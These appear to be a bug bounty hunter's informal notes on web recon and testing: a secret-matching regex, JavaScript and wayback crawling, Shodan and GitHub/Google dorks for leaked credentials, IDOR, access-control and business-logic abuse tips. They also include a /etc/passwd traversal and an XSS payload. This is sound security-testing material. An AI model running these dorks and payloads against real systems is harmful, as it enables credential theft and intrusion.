password|bintray_apikey|bintray_gpg_password|bintray_key|bintraykey|bluemix_api_key|bluemix_pass|browserstack_access_key|bucket_password|bucketeer_aws_access_key_id|bucketeer_aws_secret_access_key|built_branch_deploy_key|bx_password|cache_driver|cache_s3_secret_key|cattle_access_key|cattle_secret_key|certificate_password|ci_deploy_password|client_secret|client_zpk_secret_key|clojars_password|cloud_api_key|cloud_watch_aws_access_key|cloudant_password|cloudflare_api_key|cloudflare_auth_key|cloudinary_api_secret|cloudinary_name|codecov_token|config|conn.login|connectionstring|consumer_key|consumer_secret|credentials|cypress_record_key|database_password|database_schema_test|datadog_api_key|datadog_app_key|db_password|db_server|db_username|dbpasswd|dbpassword|dbuser|deploy_password|digitalocean_ssh_key_body|digitalocean_ssh_key_ids|docker_hub_password|docker_key|docker_pass|docker_passwd|docker_password|dockerhub_password|dockerhubpassword|dot-files|dotfiles|droplet_travis_password|dynamoaccesskeyid|dynamosecretaccesskey|elastica_host|elastica_port|elasticsearch_password|encryption_key|encryption_password|env.heroku_api_key|env.sonatype_password|eureka.awssecretkey)[a-z0-9_ .\-,]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([0-9a-zA-Z\-_=]{8,64})['\"]



  
  
  JAVASCRIPT-FILE-FOR-BUG-HUNTERS
  Manual Checking JavaScript:
  
   developer tools, --> HTML source code. Look for JavaScript references within the HTML file, which are often included using <script> tags. You can click on these references to view the JavaScript code  0r network tab-- > sourc file  --> open 
   
 ***  Make sure you set up your burp proxy and keep it running in background. Take a deep dive into your target, thoroughly examining all its features and endpoints. Once you’re done, head over to the proxy tab and configure the filters as shown below to capture all the JavaScript files which are  scripts, shown only in scope items, and shown only js . Don’t forget to copy all the results and save them in a file called “link.txt”.   then run 
            wget -P jsfiles -i link.txt    
            all keywords manually “api key, api_key, password, secret, token, access, pwd, url, config, aws, s3” etc.  check and use the below regex
         regix =  https://github.com/l4yton/RegHex
         validate keys =  https://github.com/streaak/keyhacks
         https://github.com/dirtycoder0124/formcrawler   ----> This script Crawls the website and finds the URLs that contain html forms.
  
  with tools
  cat target.txt | gau | grep ".js" | tee js.txt
cat target.txt | waybackurls | grep ".js" | tee -a js.txt
cat target.txt | subjs | httpx -mc 200 | tee -a js.txt
cat js.txt | Mantra
cat js.txt | while read url;do python3 SecretFinder.py -i $url -o cli ; done > endpoint
nuclei -l js.txt -t /root/nuclei-templates/http/exposures/ -o js_bugs.txt

bash JSFScan.sh -l target -all -r -o result.ru

  
 
 pip install jsbeautifier. Then, you run it with js-beautify -o outfile.txt scripts.txt. This will output the file outfile.txt which you can easily browse through.
 
 Now that we have a readable version of all the JavaScript code in one place, I like to start with Grep to get a feel of what I am expecting. The general command is grep --color -i term outfile.txt. You just change the word term with what you’re looking for. For example, try words like secret, admin, password or token to find hardcoded secrets. Alternatively, you can use a path prefix to look for endpoints. Say you noticed that all API endpoints start with /api/v1. In this case, you can substitute the word term in the grep command with /api/v1 to collect all the API endpoints.
 
 
 onliner to extract endpoints from JS files of a given host
 ./js at my kali/scan/
 


     
                                                  
keywords to look for  in javascript files:pathname url:, POST, api, GET, setRequestHeader, send( (yes with just one (, as it's used when making Ajax requests!. .headers, onreadystatechange, var {xyz} = , getParameter(), parameter, .theirdomain.com, apiKey. and also postMessage, messageListener, .innerHTML, document.write(, document.cookie, location.href, redirectUrl, window.hash.


 getting javasacript files
 source code/developers tools -> search for .js , then copy and paste in vscode and search for all ** word 
 

 WAYBACKURL FOR BUG HUNTING
 # Only get all urls from wayback machine
wayback_machine_downloader http://target.com -c 5 > all_urls.txt



    waybackurl  (check the github usage)
    echo "url" | waybackurl
    


    waybackmachine
ttps://web.archive.org/web/*/facebook.com/*
.zip
.backup
.config
.csv
.pdf
/api
/admin/
grep "\.txt"
~ "\.log"
~ "\.cache"
~ "\.secret"
~ "\.db"
~ "\.backup"
~ "\.yml"
~ "\.json"
~ "\.gz"
~ "\.rar"
~ "\.zip"
~ "\.config"     

      
       

     Directory Bruteforcing / content discovery
     
     dirb tesla.com (wordlist)


# bruteforcing url and excluding status code (e.g. 302)
gobuster dir -u target.com -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -b 302

gobuster dns -d mysite.com -t 50 -w subdomains.txt
gobuster vhost -u https://mysite.com -t 50 -w subdomains.txt
gobusster dir -u (url) -w /usr/share/wordlist/dirbuster/directory-list-2.3-medium.txt
gobuster vhost -u (url)  -w /usr/share/wordlist/seclists/Discovery/web-content/directory-list-2.3-medium.txt

fuff -u (url)/fuzz  -w /usr/share/wordlist/dirbuster/directory-list-2.3-medium.txt
 fuff -u (url)/fuzz  -w /usr/share/wordlist/dirbuster/directory-list-2.3-medium.txt ml 200, 301






finding files
gobusster dir -u (url) -w /usr/share/wordlist/dirbuster/directory-list-2.3-medium.txt -x,html,css,.js
fuff -u (url)/fuzz  -w /usr/share/wordlist/dirbuster/directory-list-2.3-medium.txt -e .html,.css,.js.conf

Vhost enumeration
fuff -u (url)  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "HOST:FUZZ.EXAMPLE.COM"
gobuster vhost -u (url)  -w /usr/share/wordlist/seclists/Discovery/DNS/subdomains-top1million-20000.txt --append-domain
    


      whoxy.com   //asset discovery  for root domain

Perform reverse DNS lookups on the IP’s you discover through these search engines and see if you can identify IPs, ASN’s, root domains, or other unlinked company owned assets. (shodan , censys, and whoxy.com)


Ports:8443, 8080 Title: "Dashboard[Jenkins]" Product: Tomcat Hostname: example.com Org: google ssl:Google



     SHODAN FOR BUG HUNTING 
     assest discovery using shodan cli                   check nahamesec video on shodan
     
     ssl:redacted.com "200"
     
 shodan init api-key
     shodan domain -h
     shodan domain -D url -S
     shodan jq -r '.hostnames' (filename)
     shodan jq -cs '.[0] (filename) | jq -r
     shodan jq -r '.ip_str' (filename) | httpx -titles  -port 443,80,8080              \\ ip address of the domain name
     shodan search org:\"ford motors\" | --fields ip_str, port,http.title
       shodan search org:\"ford motors\" \!port:80,443 | --fields ip_str, port,http.title                     being creative with your search  || \!port:80,443 this means dont show 
       shodan search org:\"ford motors\" \!port:80,443 | --fields ip_str, port,http.title | awk '{print $1, $2 }'  tr " " :"
        shodan search org:\"ford motors\" \!port:80,443 | --fields ip_str, port,http.title | awk '{print $1, $2 }'  tr " " :" | nuclei                         pass to other tools
         shodan search org:\"ford motors\" \!port:80,443 | --fields ip_str, port,http.title | awk '{print $1, $2 }'  tr " " :" | nuclei  | httpx -title -follow-host-redirect   
         
          shodan search search ssl:form.com  --fields ip_str, port,http.title | awk '{print $1, $2}' | tr " " " : "
         shodan search search asn:AS3389  --fields hostnames | tr ";" "\n" | sort -u | domainparser   
          shodan search search asn:AS3389  --fields hostnames | tr ";" "\n" | sort -u | domainparser | sort u | xargs -I{} shodan search ssl:{} -fields ip_str,port
          
          shodan search org:target.com hostnames:localhost
         
     
https://www.shodan.io/search?query=ssl%3A%22Paypal%22

https://www.shodan.io/search?query=ssl%3A%22Paypal%22+200

You can also negative search for specific content you don’t wish to search for by append — in our query followed by the pattern.
https://www.shodan.io/search?query=org%3A%22Amazon%22+ssl%3A%22Paypal%22
https://www.shodan.io/search?query=http.component%3A%22jenkins%22
https://www.shodan.io/search?query=html%3A%22Dashboard+Jenkins%22





              GOOGLE DORKS
              
          Google dorking tip, if you see an interesting subdomain, don't be afraid to query it by itself in google :)
for example, site:interesting.subdomain.com ext:txt
              
Broad domain search w/ negative search
site:example.com -www -shop -share -ir -mfa

 site:example.com intext:password | passcode | intext:username | userid | user | email | credit card | SSN filetype:csv
 
 inurl:example.com intitle:"index of"
inurl:example.com intitle:"index of /" "*key.pem"
inurl:example.com ext:log
inurl:example.com intitle:"index of" ext:sql|xls|xml|json|csv
inurl:example.com "MYSQL_ROOT_PASSWORD:" ext:env OR ext:yml -git
 
 
 
  GOOGLE DORK FOR SUBDOMAIN TAKEOVER  
     site:"*,example.com" intext:"PAGE NOT FOUND" | intext:"project not found" | intext:"repository not found" | intext:"domain does not exist" 
     | intext:"this page cound not be found" | intext:"404 Blog is not found" | intext:"domain name is invalid" | intext:"No settings were found for this company"
 

ext:php inurl:? site:example[.]com


ext:log | ext:txt | ext:conf | ext:cnf | ext:ini | ext:env | ext:sh | ext:bak | ext:backup | ext:swp | ext:old | ext:~ | ext:git | ext:svn | ext:htpasswd | ext:htaccess site:example[.]com


"http://Target.com" language:yml 
"Target. com" language:yml "_key"
"Target. com" language:yml "admin"
"Target. com" language:yml "root"
"Target. com" language:yml "host"


PHP extension w/ parameters
site:example.com ext:php inurl:?
 intitle: index X of inurl: backup
 inurl:index.php.bak
 filetype:xls inurl:1 xls0
 site:anu.edu inurl:admin
 intitle:index of "apache/1.3.27 server at
 inurl:ws_ftp.log
 intitle:index of inurl:admin 

Disclosed XSS and Open Redirects
site:openbugbounty.org inurl:reports intext:"example.com"

Juicy Extensions
site:"example[.]com" ext:log | ext:txt | ext:conf | ext:cnf | ext:ini | ext:env | ext:sh | ext:bak | ext:backup | ext:swp | ext:old | ext:~ | ext:git | ext:svn | ext:htpasswd | ext:htaccess

XSS prone parameters
inurl:q= | inurl:s= | inurl:search= | inurl:query= | inurl:keyword= | inurl:lang= inurl:& site:example.com

Open Redirect prone parameters
inurl:url= | inurl:return= | inurl:next= | inurl:redirect= | inurl:redir= | inurl:ret= | inurl:r2= | inurl:page= inurl:& inurl:http site:example.com

SQLi Prone Parameters
inurl:id= | inurl:pid= | inurl:category= | inurl:cat= | inurl:action= | inurl:sid= | inurl:dir= inurl:& site:example.com

SSRF Prone Parameters
inurl:http | inurl:url= | inurl:path= | inurl:dest= | inurl:html= | inurl:data= | inurl:domain= | inurl:page= inurl:& site:example.com

LFI Prone Parameters
inurl:include | inurl:dir | inurl:detail= | inurl:file= | inurl:folder= | inurl:inc= | inurl:locate= | inurl:doc= | inurl:conf= inurl:& site:example.com

RCE Prone Parameters
inurl:cmd | inurl:exec= | inurl:query= | inurl:code= | inurl:do= | inurl:run= | inurl:read= | inurl:ping= inurl:& site:example.com

High % inurl keywords
inurl:config | inurl:env | inurl:setting | inurl:backup | inurl:admin | inurl:php site:example[.]com

Sensitive Parameters
inurl:email= | inurl:phone= | inurl:password= | inurl:secret= inurl:& site:example[.]com

API Docs
inurl:ap
cs | inurl:api-docs | inurl:swagger | inurl:api-explorer site:"example[.]com"

Code Leaks
site:pastebin.com "example.com"

site:jsfiddle.net "example.com"

site:codebeautify.org "example.com"

site:codepen.io "example.com"

Cloud Storage
site:s3.amazonaws.com "example.com"

site:blob.core.windows.net "example.com"

site:googleapis.com "example.com"

site:drive.google.com "example.com"

site:dev.azure.com "example[.]com"

site:onedrive.live.com "example[.]com"

site:digitaloceanspaces.com "example[.]com"

site:sharepoint.com "example[.]com"

site:s3-external-1.amazonaws.com "example[.]com"

site:s3.dualstack.us-east-1.amazonaws.com "example[.]com"

site:dropbox.com/s "example[.]com"

site:box.com/s "example[.]com"

site:docs.google.com inurl:"/d/" "example[.]com"

JFrog Artifactory
site:jfrog.io "example[.]com"

Firebase
site:firebaseio.com "example[.]com"

File upload endpoints
site:example.com ”choose file”

Dorks that work better w/o domain
Bug Bounty programs and Vulnerability Disclosure Programs
"submit vulnerability report" | "powered by bugcrowd" | "powered by hackerone"

Apache Server Status Exposed
site:*/server-status apache

WordPress
inurl:/wp-admin/admin-ajax.php

Drupal
intext:"Powered by" & intext:Drupal & inurl:user

Joomla
site:*/joomla/login

Google Dork - Open Redirects
inurl:(url= | return= | next= | redirect= | redir= | ret= | r2= | page=) inurl:& inurl:http site:example[.]com





## use WaybackRust        .. a too made with rust 
   waybackrust urls [FLAGS] [OPTIONS] <domain.com or file.txt or stdin>
 waybackrust urls gap.com --output ~/Desktop/file.txt > ~/Desktop/another_file.txt
   

FLAGS:
    -h, --help       Prints help information
    -n, --nocheck    Don't check the HTTP status
    -p, --nocolor    Don't colorize HTTP status
        --silent     Disable informations prints
    -s, --subs       Get subdomains too
    -V, --version    Prints version information
     -b, --blacklist <extensions to blacklist>        The extensions you want to blacklist (ie: -b png,jpg,txt)
    -d, --delay <delay in milliseconds>             
    -o, --output <FILE>
            Name of the file to write the list of urls (default: print on stdout)

    -t, --threads <Number of concurrent requests>    
    -w, --whitelist <extensions to whitelist> 



Github For Recon 

path:**/.env AWS_ACCESS_KEY_ID
DB_PASSWORD=
path:*.sql "CREATE TABLE" AND "INSERT INTO
 path:**/.properties api_key
path:**/docker-compose.yml MYSQL_ROOT_PASSWORD
language:javascript jwt_secret OR jwt_key
path:*.pem private  
path:*.pub "ssh-rsa" 
 
"http://Target.com" language:yml 
"Target. com" language:yml "_key"
"Target. com" language:yml "admin"
"Target. com" language:yml "root"
"Target. com" language:yml "host"

api_key
authorization_bearer:
authentication
auth
token
client_secret
secret
private_key
username
api_token
client_id
password
user_pass
user_password
OTP
DB_DATABASE=
DB_PASSWORD=
DB_PW=
DB_USER=dotfiles
filename:sftp-config.json password
filename:.s3cfg
filename:config.php dbpasswd
filename:.bashrc password
filename:.esmtprc password
filename:.netrc password
filename:_netrc password
filename:.npmrc _auth
filename:WebServers.xml
filename:sftp-config.json
filename:.esmtprc password
filename:passwd path:etc
filename:prod.secret.exs
filename:sftp-config.json
filename:proftpdpasswd
filename:travis.yml
filename:vim_settings.xml
filename:sftp.json path:.vscode
filename:secrets.yml password




search for token,key, secret, password
search?q={COMPANY_NAME}-&type=Users
"Company name" send_keys or sendkeys
"company.com" "dev"
"dev.company.com"
"company.com" API_key
"company.com" password
"api.company.com" authorization
TIP:
1- check those dorks in github, you will always find somthing interesting 
"Company name" language:python
"Company name" language:bash
2- keep monitoring js files for changes to find new endpoints
3- bruteforce and search for hiddin js files other that whats called in app.

*"target(.)com" password
*"target(.)com" "pass" 'email'
*"target(.)com" "api"
*"target(.)com" FTP
*"target(.)com" SMTP
*"target(.)com" LDAP
*"target(.)com" PEM (For Keys)
Try to remove the (.)com and do the same thing. 
Big domains? Give spaces between them, like "target xyz" and do the 


         tip
Perform dirsearch for all subdomains
JSParser -  for reading javascript files
extracting links from JS file LinkFinder(https://github.com/GerbenJavado/LinkFinder) - extracting endpoints from JS files
Check robots.txt page

 END End 

 

 
 
 BOKEN LINK HIJACKING
Manually find and click external links on the target site ( For Example:- Some Links to Social Media Accounts or Some external Media Link)

While Doing Manual work also put broken-link-checker in background using below Command interminal.

blc -rof --filter-level 3 https://example.com/
Ouput will be like Something.
─BROKEN─ https://www.linkedin.com/company/ACME-inc-/ (HTTP_999)
Now you need to check if company has the page or not , if no then register as the company or try to get that username or url.
   
   
   BURP SUITE COOK BOOK
   BROKEN ACCESS CONTROL  
   ALWAYS REPLACE BOTH THE COOKIE AND REFERER OF AN AUTHICATED( ORIGINAL PASSWORD AND USERNAME ) REQUEST INTO AN UNAUTHENCATED (FAKE PASSWORD AND FAKE USERNAME) IN BURP
   
   TEASTE FOR BROWERS CACHE WEAKNESS , this is by loginin and also log out  of you appilcation and then click the browers back botton to verify if you could login
   
   changing the usid of the user and also changing the application name to admin could lead to privilage esccalation
   
   check for IDOR of the login page/ source page  by changing the upload-file.php to ../../../../etc/passwd
   
   session fixation ->  using the comparer tool in burp to show/  chcek  the  session cookie of an browers session cookie when not login and when login   
  
  testing for expose -session varaibles-> try to change application roles to admin , it manyatimes exposes the hidden fleid of an appliction    //change from user to admin
  
  when running an unathenticated testing of a web app, check for web app poinsoing in the post request  and check if the content type is returning index.html/text .html
  
  /// thread checking /////
  always check for business thread issues when testing apps shopping cart thereby intercepting the cart request and makng changing of amout of goods or price of goods. and then copy burp new request to the browers and check if the could buy at the same amount with the previous request.. 
  
  
  
  
  
  
  tools for subdomain 
  amass
  findomain
  subfinder
  sublist3r
  assetfinder
  bbot
  
  for port scanning
  naabu
  masscan
  nmap
  skanuvaty 
  
  director bruteforce
  gobuster
  fuff
  dirb
  
  xss bruteforce
  qsreplace
  xss-vibes
  
  sensitive discovery in js files
  SecretFinder.py
  photon
  
   
  
   TOOLS FOR PARAMters spidering of url
   arjun
   paramspider
   katana 
   hawkrawler
   gosipder
   
   filtering out live domain
   httpx
   httprobe
   
 
   
  tools for  geting  way backurl
  waybackurl
  gau
  photon
  
    tools for  SUBDOMAIN TAKEOVER
     Hostilesubruteforce
     ruby sub-brute.rb
     sub404
     python3 sub404.py  -f
      subjack
       https://github.com/sarveshkapre/subdomain_takeover
       subzy
      
     tools for  asset discory
     crt.sh
     cenys
     shodan
      
  
    FOOTPRINTING WEBSITES 
      whatweb (url) -v a4
      osint framwork.com
     netcratf.com
     securityheaders.com
     Dnsdumster.com
     whois.com
     mxtoolbox.com
     emkel.c2       //// fakemails 
     
     visual recon 
     gowitness
     https screenshoot
     
  
   
   
   TOOLS TO CHECK ON  
   subdomain_takeover         https://github.com/sarveshkapre/subdomain_takeover
   XSS-Automation-Tool        https://github/EmperialX/Xss-automation-Tools    
   URL-hunter                 https://github/SecuritySphinx/Url-hunter
   ParamAngler                https://spyx/ParamAngler  
   pytractor                  https://Noll101/pytrator
   w3af.org
   X-Recon                    https://joshkar/X-recon
   jsfinder                   https://kacakb/jsfinder
   Lfi-space                  https://capture0x
   klyda                      https://Xeonrx       dictionary spray
  
  
  TIPS
  
  Scan each individual IP address associated with their subdomains and having the output saved to a file  &&
CHECK FOR OPEN PORT TOOLS, PORT COMMONLY USED 80, 441, 81   &&
Look for any services running on unusual ports or any service running on default ports which could be vulnerable (FTP, SSH, etc). Look for the version info on services running in order to determine whether anything is outdated and potentially vulnerable

    tip
    
# Download all js urls and merge together and finally grep on:
wget --no-check-certificate -i js.txt
cat file1.js file2.js file3.js file4.js file5.js > all_js.js
cat all_js.js | grep -r -E # Similar to the grep above...
           RUN
nuclei -l js.txt -t ~/nuclei-templates/exposures/ -o js_exposures_results.txt



                           IDORS      IDORS      IDORS   
   Base Steps:
1. Create two accounts if possible or else enumerate users first.
2. Check if the endpoint is private or public and does it contains any kind of id param.
3. Try changing the param value to some other user and see if does anything to their account.
4. Done !!

  tip  failure to invalidate session
 
Perform the following steps:
Log in to the application
Again log in to the same account from different browser.
Attempt to change the password. The application will send a password reset link to your email.
Open the link and reset the password.
Go to the other browser and reload the page. If you are successfully able to reload the page and still logged in, you have a bug!

  tip
  Password Reset Link sent over HTTP
This is something very small that you can check when you are clicking the reset password link; you can check if the link is an HTTP or HTTPS link. If you find the reset link in HTTP, you got a bug!

  tip
  While deleting account
Remember you should always check all the functionalities of an account including deleting the account. Here's something you should check-

Log in to the application.
Go to profile and try to delete the account.
The application should ask you for your account password to delete the account.
If not, you got a bug!
  

  tip
  https://twitter.com/nullenc0de/status/1770207082945421391
  1) Identify the what the app uses for identifiers. Most of the time it's UUIDs.

 2) Install https://github.com/PortSwigger/uuid-detector and map the application. Notice the UUID's will be stored under "issues" in burp. They will be informational, but very helpful.
 Most of the time you will find some common UUIDs. They are probably associated with a project, org or user account.

3) Enter all those UUIDs into your match and replace. Add these as a string to in the replace fields.
4) Use another account to do the same thing. Notice those new UUIDs get populated in the Issues section. Note the common ones.

5) Enter those new UUIDs as a match field.
6) Map the application again. Start populating fields and view objects. Be aware at what is happening. If you don't get error messages everywhere. It likely means there is an IDOR there and it's time to check the other user account.


   tip tip
     Hunting for IDORs? Don't just change the ID. In this case, the webserver may use the ID in the URL for validating access, but use the ID in the GET parameter to get the data! 
     https://target.com/user/6764    get your own account
     
      https://target.com/user/6765    403 forbidden
      https://target.com/user/6764huserid-6765    200 0k
   
   
   ##tip   
   Add IDs to requests that don’t have them
   GET /api/MyPictureList → /api/MyPictureList?user_id=<other_user_id>

  Pro tip: You can find parameter names to try by deleting or editing other objects and seeing the parameter names used.
  
  tip
  allows try and see if you could login with any company email diplay on the browers
  
  tip
  allow place  %00”  , space (-)  before and after the email and watch the response  example are smartkelvin@wearehackerone%00  smartkelvin@wearehackerone%00-
  NOTE, allows when using google auth signup, check if you can reregister an  account with the account used in the auoth signup
  
  #tip
  1. change the price with other price :100->50
2. change the price with nagative price :100->-100
3. change the price with other price by add nagative value: 100 ->(+-120)
4. change the price with other price by mult by 0.5: 100->(0.5*100)
  
  
      ##tip  Try replacing parameter names
GET /api/albums?album_id=<album id>

Try This:
GET /api/albums?account_id=<account id>

Tip: There is a Burp extension called Paramalyzer which will help with this by remembering all the parameters you have passed to a host.
   
   
        ##tipSupply multiple values for the same parameter.
GET /api/account?id=<your account id> →

Try this:    
GET /api/account?id=<your account id>&id=<admin's account id>

GET /api_v1/messages?user_id=attacker_id&user_id=victim_id
GET /api_v1/messages?user_id=victim_id&user_id=attacker_id

GET /api/account?id=<your account id> →
    /api/account?id=<your account id>&id=<admin's account id>

Tip: This is known as HTTP parameter pollution. Something like this might get you access to the admin’s account
    

    ##tip   Try changing the HTTP request method when testing for IDORs
   POST /api/account?id=<your account id> →

   Try this:    
PUT /api/account?id=<your account id>

   Tip: Try switching POST and PUT and see if you can upload something to another user’s profile. For RESTful services, try changing GET to POST/PUT/DELETE to discover create/update/delete actions.
   
    
    ##tip  : Try changing the request’s content type
    
    POST /api/chat/join/123 […] Content-type: application/xml → test
Try this:
POST /api/chat/join/123 […] Content-type: application/json {“user”: “test”}
Tip: Access controls may be inconsistently implemented across different content types. Don’t forget to try alternative and less common values like text/xml, text/x-json, and similar

     ##tip   : Try changing the requested file type (Test if Ruby)
     Example:

GET /user_data/2341 --> 401 Unauthorized
GET /user_data/2341.json --> 200 OK

GET /user_data/2341.xml -> 200
GET /user_data/2341.config -> 200
GET /user_data/2341.txt -> 200

Tip: Experiment by appending different file extensions (e.g. .json, .xml, .config) to the end of requests that reference a document.

     
     ##tip    Does the app ask for non-numeric IDs? Use numeric IDs instead
     There may be multiple ways of referencing objects in the database and the application only has access controls on one. 
   Try numeric IDs anywhere non-numeric IDs are accepted:
Example:

username=user1 → username=1234
account_id=7541A92F-0101-4D1E-BBB0-EB5032FE1686 → account_id=5678
album_id=MyPictures → album_id=12

  GET /file?id=90djbkdbkdbd29dd
GET /file?id=302

  tip
  Always check the source code   and ctr+f and check for key names and veriables , if the website using userid for verification  create a second account to see if the userid value is similar or not, and check how it generate it
   Understand how the website works  



  ##tip Try using an array
    If a regular ID replacement isn’t working, try wrapping the ID in an array and see if that does the trick. For example:

    {“id”:19} → {“id”:[19]}
     
   {"userid":123} ->401
    {"userid":[123]} ->200
    
    [ ] wrap the id with a json object
{"userid":123} ->401
{"userid":{"userid":123}} ->200

   ##tip   json parameter changes
    {"userid":"1", "password":"oops"},
    {"password":"oops","userid":"1"}
    
    ##tip  : Wildcard ID **
    These can be very exciting bugs to find in the wild and are so simple. Try replacing an ID with a wildcard. You might get lucky!

GET /api/users/<user_id>/ → GET /api/users/*

  
  ##tip    Pay attention to new features
  If you stumble upon a newly added feature within the web app, such as the ability to upload a profile picture for an upcoming charity event, and it performs an API call to:

/api/CharityEventFeb2021/user/pp/<ID>

It is possible that the application may not enforce access control for this new feature as strictly as it does for core features.

   ##tip
   [ ] Path Traversal
POST /users/delete/victim_id ->403
POST /users/delete/my_id/..victim_id ->200

     ##tip 
     
     [ ] Missing Function Level Acess Control
GET /admin/profile ->401
GET /Admin/profile ->200
GET /ADMIN/profile ->200


GET /aDmin/profile ->200
GET /adMin/profile ->200
GET /admIn/profile ->200
GET /admiN/profile ->200

  tip    this is authoraization issues
    Capture the POST request responsible for inviting any  user and send this request to repeater.
Change the authorization token to a user token having no plan. Also changed the workspace ID parameter.

  tip
  First invite a member with “user” role permission.
This role has no permission to see other members and plan used.
But by directly sending the API calls. i.e. :
https://api.target.com/workspace/restrictions
https://api.target.com/workspace/users?limit=100&offset=0
https://api.target.com/workspace/invitations?limit=1000&offset=0
https://api.target.com/workspace/user_balance
.
  tip
  replacing the character a of the domain name with IDN character á (for e.g. auth.target.com is now auth.tárget.com) could get you a sugar 

  
  
  

  #tip
  
   Review Functionality
Some applications have an option where verified reviews are marked with some tick or it's
mentioned. Try to see if you can post a review as a Verified Reviewer without purchasing that
product.

   tip
 some app  provides you with an option to provide a rating on a scale of 1 to 5, try to go
beyond/below the scale-like provide 0 or 6 or -value.
Try to see if the same user can post multiple ratings for a product. This is an interesting
endpoint to check for Race Conditions.

  tip
   Coupon Code Functionality
Apply the same code more than once to see if the coupon code is reusable.
If the coupon code is uniquely usable, try testing for Race Condition on this function by using
the same code for two accounts at a parallel time.
Try Mass Assignment or HTTP Parameter Pollution to see if you can add multiple coupon codes
while the application only accepts one code from the Client Side.

  tip
  Try adding discount codes on the products which are not covered under discounted items by
tampering with the request on the server-side.
    **Delivery Charges Abuse **
Try tampering with the delivery charge rates to -ve values to see if the final amount can be
reduced.

  tip
  **Premium Feature Abuse **
Try forcefully browsing the areas or some particular endpoints which come under premium
accounts.
Pay for a premium feature and cancel your subscription. If you get a refund but the feature is still
usable, it's a monetary impact issue.
Some applications use true-false request/response values to validate if a user is having access to
premium features or not.
Try using Burp's Match & Replace to see if you can replace these values whenever you browse the
app & access the premium features.
Always check cookies or local storage to see if any variable is checking if the user should have access
to premium features or not.

   tip
   . Refund Feature Abuse
Purchase a product (usually some subscription) and ask for a refund to see if the feature is still
accessible. and aslo try currucy arbitatration by chanhe $ to E

Try making multiple requests for subscription cancellation (race conditions) to see if you can get
multiple refunds.

  tip
  also change socail media links  as javascript:alert(document.domain) and watch the responses

  tip
  Thread Comment Functionality
Unlimited Comments on a thread
Suppose a user can comment only once, try race conditions here to see if multiple comments are
possible.

   tip
    **Cart/Wishlist Abuse **
Add a product in negative quantity with other products in positive quantity to balance the amount.
Add a product in more than the available quantity.
Try to see when you add a product to your wishlist and move it to a cart if it is possible to move it to
some other user's cart or delete it from there.

 tip
 
Suppose there is an option: comment by the verified user (or some privileged user) try to tamper
with various parameters in order to see if you can do this activity.
Try posting comments impersonating some other users.

  tip
  Business Flow Bypass Applications include flows that are controlled by redirects and page transfers.
After a successful login, for example, the application will transfer the user to the money transfer
page.During these transfers, the user’s session is maintained by a session cookie or other
mechanism. In many cases,
this flow can be bypassed which can lead to an error condition or information leakage. This leakage
can help an attacker identify critical back-end information. If this flow is controlling
and giving critical information out then it can be exploited in various use cases and scenarios How
to test for this business logic flaw:
• During the profiling phase or through a proxy observe the HTTP traffic, both request and respon
• POST/GET requests would have typical parameters either in name-value pair, JSON, XML or Cookies
• Identify business functionalities which are in specific steps (e.g. a shopping cart or wire transfer
• Analyze all steps carefully and look for possible parameters which are added by the application
• These parameters can be tampered through a proxy while making the transaction
  
    tip
     Add/Change the API version in the route Failed
       We need to check if older versions of API exist by adding /v1/, /v2/, or /v3/ to the route.
    GET /v3/users_data/1234 ->401
   GET /v1/users_data/1234 ->200
   
   tip
   check if the intercept contains time, if yes try to delete and manipulate the time, rearragne the post, put or get parameter 
   
   tip
   [ ] If the website using graphql, try to find IDOR using graphql!
   GET /graphql
   [...]
  GET /graphql.php?query=
   [...]
   
   tip 
   sometimes, always, sometimes,  manually built the GET request from the POST
   GET /api/v1/reportservice/details/{clientname}/456 HTTP/2
   
   
   
   
   
   
   
   tip
[ ] json parameter pollution
{"userid":1234,"userid":2542}

    tip
    [ ] Bypass object level authorization Add parameter onto the endpoit if not present by defualt
GET /api_v1/messages ->200
GET /api_v1/messages?user_id=victim_uuid ->20

  tip
  Critical Parameter Manipulation and Access to Unauthorized Information/Content. HTTP GET and
POST requests are typically accompanied with several parameters when submitted to the
application. These parameters can be in the form of name/value pairs, JSON, XML etc. Interestingly,
these parameters can be tampered with and guessed (predicted) as well. If the business logic of the
application is processing these parameters before validating them, it can lead to
information/content disclosure. This is another common business logic flaw that is easy to exploit
How to test for this business logic flaw:
• During the profiling phase or through a proxy, observe HTTP traffic, both request and response
• POST/GET requests would have typical parameters either in name-value pair, JSON, XML or Cookies
the parameter and the value need to be analyzed.
• Observe the values in the traffic and look for incrementing numbers and easily guessable values
• This parameter’s value can be changed and one may gain unauthorized access.

 tip
  LDAP Parameter Identification and Critical Infrastructure Access** LDAP is becoming an important
aspect for large applications and it may get integrated with ”single sign on” as well. Many
infrastructure layer tools like Site Minder or Load Balancer use LDAP for both authentication and
authorization. LDAP parameters can carry business logic decision flags and those can be abused and
leveraged. LDAP filtering being done at the business application layer enable logical injections to be
possible on those parameters. If the application is
not doing enough validation then LDAP injection and business layer bypasses are possible.
How to test for this business logic flaw:
• During the profiling phase or through a proxy observe the HTTP traffic, both request and respon
• POST/GET requests would have typical parameters either in name-value pair, JSON, XML or Cookies
the parameter and the value need to be analyzed.
• Analyze parameters and their values, look for ON,CN,DN etc. Usually these parameters are linked
for the parameter taking email or usernames, these parameters can be prospective targets.
• These target parameters can be manipulated and injected with “*” or any other LDAP specific fil
can lead to logical bypass over LDAP and end up escalating access rights.
 
   

 tip
Developer’s cookie tampering and business process/logic bypass. Cookies are an essential
component to maintain state over HTTP. In many cases, developers are not using session cookies
only, but instead are building data internally using session only variables. Application developers set
new cookies on the browser at important junctures which exposes logical holes. After authentication
logic sets several parameters based
on credentials, developers have two options to maintain these credentials across applications. The
developer can set the parameters in session variables or set cookies in the browser
with appropriate values. If application developers are passing cookies, then
they might be reverse engineered or have values that can be guessed/ deciphered. It can create a
possible logical hole or bypass. If an attacker can identify this hole then they can exploit it with ease
How to test for this business logic flaw:
• During the profiling phase or through a proxy observe the HTTP traffic, both request and response
• Analyze all cookies delivered during the profiling, some of these cookies will be defined by de
session cookies defined by the web application server.
• Observe cookie values in specific, look for incrementing easily guessable values across all coo
• Cookie value can be changed and one may gain unauthorized access or logical escalation




  


    ##########   ######      ######      #####

[ ] [ ] image profilie [ ] delete acount [ ] infromation acount [ ] VIEW & DELETE & Create api_key [ ] allows
to read any comment [ ] change price [ ] chnage the coin from dollar to uaro [ ] Try decode the ID, if the
ID encoded using md5,base64,etc
GET /GetUser/dmljdGltQG1haWwuY29t
[...]

